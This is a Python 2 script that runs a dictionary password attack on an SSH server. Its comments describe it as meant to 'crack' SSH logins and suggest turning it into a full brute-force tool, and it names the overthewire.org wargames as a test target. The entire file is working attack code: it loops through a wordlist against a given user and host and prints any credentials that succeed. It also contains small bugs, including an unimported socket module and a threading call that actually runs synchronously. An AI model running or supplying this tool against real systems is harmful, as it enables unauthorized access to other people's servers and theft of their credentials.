#!/usr/bin/env python

import paramiko, sys, time, threading 

############################################
# This script is meant to explicitly crack an SSH server given a dictionary file of passwords.
# It could easily be manipulated to run through a brute-force list using itertools.
# To issue a test run, you may attempt to pentest one of the wargames servers over at overthewire.org
# So long as ssh.py has correct permissions to run, simply type:
# ./ssh.py manpage0 manpage0.labs.overthewire.org dictionary
############################################

def attempt(IP,UserName,Password):

	ssh = paramiko.SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())

	try:
		ssh.connect(IP, 22, UserName, Password)

	except paramiko.AuthenticationException, error:
		print '[-] Password failed: %s' % (Password)
	
	except socket.error, error:
		print '[-] Socket Error.'

	except paramiko.SSHException, error:
		print '[-] Attempt failed, probably a missing host key.'

	except Exception, error:
		print '[-] Unknown error!'

	else:
		print '\n[!] Found the correct credentials!\nUsername: %s\nPassword: %s\n' % (UserName, Password)
		ssh.close()
		sys.exit(1)

	ssh.close()

	return

def main():

	if len(sys.argv) < 4:
		print "\nUsage: %s Username Hostname /path/to/dictionary" % (str(sys.argv[0]))
		print "\nExample: %s root 10.0.0.1 ~/dict.txt" % (str(sys.argv[0]))
		sys.exit(1)

	user = sys.argv[1]
	ip = sys.argv[2]
	filename = sys.argv[3]

	try:
		dictionary = open(filename, 'r')

	except IOError, error:
		print "[-] Unable to open " + filename

	print '\n[+] Bruteforcing against %s@%s with dictionary %s' % (user, ip, filename)

	for i in dictionary.readlines():
		t = threading.Thread(target=attempt(ip, user, i.strip()))
		t.start()
		time.sleep(0.5) # This doesn't make as much of a difference as I thought it would.
				# The bottleneck is probably the response time of the target.
    
	dictionary.close()
	sys.exit(0)

#############################################

if __name__ == '__main__':
	main()
